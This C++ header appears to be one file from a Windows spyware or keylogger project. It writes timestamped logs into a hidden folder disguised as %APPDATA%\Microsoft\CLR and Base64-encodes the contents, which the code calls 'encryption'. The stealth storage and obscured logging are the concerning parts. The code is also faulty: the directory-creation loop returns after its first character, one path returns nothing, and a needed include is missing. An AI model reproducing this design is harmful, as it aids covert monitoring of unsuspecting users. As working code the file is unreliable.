/*
    store all function for input output function
*/
#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "helper.h"
#include "base64.h"

namespace IO
{
    std::string GetOurPath(const bool append_saparator = false) //checks for backslash is in end or not and add if not there
    {
        std::string appdata_dir(getenv("APPDATA")); //get the appdata dir
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_saparator ? "\\" : "");
    }
    //making dir
    bool MkOneDr(std::string path)
    {
        /*
            todo
            fails when user dosent exist
            unable to escape backspace :(
        */
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }
    /*
        solved just making another function that will cope up with the flaws of other function
    */
    bool MKDir(std::string path)
    {
        for(char &c : path) //c will take path and store it in a character
        {
            if(c == '\\')
            {
                c='\0';
                if(!MkOneDr(path))
                    return false;
                c = '\\';
            }
            return true;
        }
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_")+ ".log"; //omg : is not consider as saprator so using _ freaking windows ahh
        //error catching
        try
        {
            std::ofstream file(path + name);
            if(!file) return ""; //if file cant be open
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
            //encription
            std::string data = Base64::EncryptB64(s.str());
            file << data;
            if(!file)
                return "";
            file.close();
            return name;
        } catch(...)
        {
            return "";
        }
    }
}
#endif // IO_H

